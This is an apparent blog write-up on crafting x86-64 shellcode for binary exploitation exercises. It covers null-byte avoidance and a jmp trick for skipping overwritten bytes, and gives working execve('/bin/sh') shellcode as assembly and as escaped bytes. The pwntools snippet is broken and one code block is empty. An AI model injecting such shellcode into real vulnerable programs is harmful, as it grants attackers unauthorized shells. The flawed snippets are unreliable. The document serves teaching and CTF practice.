---
title: "Shellcode Snippets: From Bytes to Bash"
date: 2025-11-02 15:10:00 +0000
categories: [Writeups, Binex]
tags: [binex, shellcode, syscalls]
description: "Learning to craft effective shellcode through creativity."
---
## Introduction
Writing shellcode often feels more like careful problem-solving than dramatic invention. You work inside tight constraints—limited bytes, no libraries, direct syscalls—so creativity shows up in practical choices: which registers to use, how to build arguments on the stack, and how to keep the payload small and reliable.

While learning to craft shellcode, I sometimes catch myself comparing the process to the work of artists—not because it’s glamorous, but because both require iteration, restraint, and a willingness to try unusual approaches until something functional emerges. Jokingly, my shellcode is more Dürer’s Head of a Bearded Child than da Vinci’s Mona Lisa. In this post, I’ll walk through a few compact examples and explain the small design decisions that make them work.

## Usage
Shellcode will primarily be placed into a buffer allocated for user input. When crafting our shellcode, it is important to keep it simple and compact since often we will be limited by our buffer sizes. 

One thing we must keep in mind is that shellcode have to be simple and compact since in real-time conditions where we have limited space in the buffer where we have to insert our shell as we as the return address to it


## Avoiding the Blank Canvas (Null-Bytes)
Writing Shellcode is not always as simple as programming a raw assembly program that executes the execve system call. In fact, many times we will be faced with limitations such as null-bytes that can inhibit the effectiveness of our shellcode. Remeber, since we are going to be inputting our Shellcode in programs that do some sort of string manipulation, we have to account for how many C programming language functions handle null-bytes.

Often, we will need to use string manipulation functions as a means for getting our shellcode into our running processes. 

```

```

To remove the null-byte in our Shellcode, we must put on our smock and get creative in our x86 instruction usage.
There are several methods to avoid null bytes. You can xor, shl/shr, push/pop values within registers so that instructions
that have null bytes, like mov, are no longer necessary. <br>


In the example I am providing, I am using xor, shr, and push/pop to avoid null bytes. 

for a second and think about how we can utilize the stack, we find that pushing and popping registers onto the 
stack will remove the null-bytes created by the mov instruction.

```
mov rdi, 0x68732f6e69622f6a
shr rdi, 8
push rdi
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
push 0x3b
pop rax
syscall
```


## Making Kinetic Art (Avoiding the Stomp)
Sometimes we may run into the issue where our shellcode is modified after we supply the code to the user input. One way to prevent this modification is through the use of the jump instruction. For instance, say we know that our shellcode is modified at bytes shellcode[16], shellcode[17], shellcode[18], shellcode[19]. This overwriting of our buffer will modify the shellcode that we provide unless we can "avoid" the alteration.

Original Shellcode
```
Python Escaped:
"\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x56\x53\x54\x6A\x3B\x58\x31\xD2\x0F\x05"

Disassembly:
31 f6                   xor    esi,esi
48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f2f6e69622f
2f 73 68
56                      push   rsi
53                      push   rbx
54                      push   rsp
6a 3b                   push   0x3b
58                      pop    rax
31 d2                   xor    edx,edx
0f 05                   syscall
```

By adding a jmp $+6 we can avoid the alteration that is done to our input, breaking the shellcode. 

#### Placing the jmp
When determining where to place the jmp instruction, we first need to understand where the alteration of our shellcode begins. When running our code in gdb, we see that we will need to place the jmp instruction after the push rbx. 
```
Python Escaped:
"\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x56\x53\xEB\x04\x54\x6A\x3B\x58\x31\xD2\x0F\x05"

Disassembly:
0:  31 f6                   xor    esi,esi
2:  48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f2f6e69622f
9:  2f 73 68
c:  56                      push   rsi
d:  53                      push   rbx
e:  eb 04                   jmp    14 <_main+0x14>
10: 54                      push   rsp
11: 6a 3b                   push   0x3b
13: 58                      pop    rax
14: 31 d2                   xor    edx,edx
16: 0f 05                   syscall
```

## Helpful Resources

| ARCH | NR | RETURN | ARG0 | ARG1 | ARG2	| ARG3 | ARG4	| ARG5 |
|---|---|---|---|---|---|---|---|---|
x86 | eax | eax | ebx | ecx | edx | esi | edi | ebp |
x64	| rax	| rax	| rdi	| rsi	| rdx |	r10 |	r8	| r9 |

> [!TIP] 
> [Helpful Syscall Calling Conventions Resource](https://syscall.sh/)

#### Using pwntools
```
#! /usr/bin/env python3

from pwn import *
context.arch = 'amd64'
my_sc_bytes = asm(```
    mov rax, 60
    mov rax, 1337
    syscall
```)
#disasm will show opcodes.
print(disasm(my_sc_bytes))

```
#### More Manual Approach to Create Shellcode
> [!TIP] 
> Assemble the object code ```gcc -nostdlib -static -o shellcode-elf shellcode.s ```
> <br>
> Pull out only the shellcode ```objcopy --dump-section .text=shellcode shellcode-elf ```
> <br>
> To view the shellcode, use hexdump.

```
.intel_syntax noprefix
.globl _start
_start:
  mov rax, 60
  mov rdi, 1337
  syscall
```

#### Links
[Shellcode/NullFree](https://nets.ec/Shellcode/Null-free) 
<br>
[pwn.college Shellcode Module](https://pwn.college/dojo/program-security)
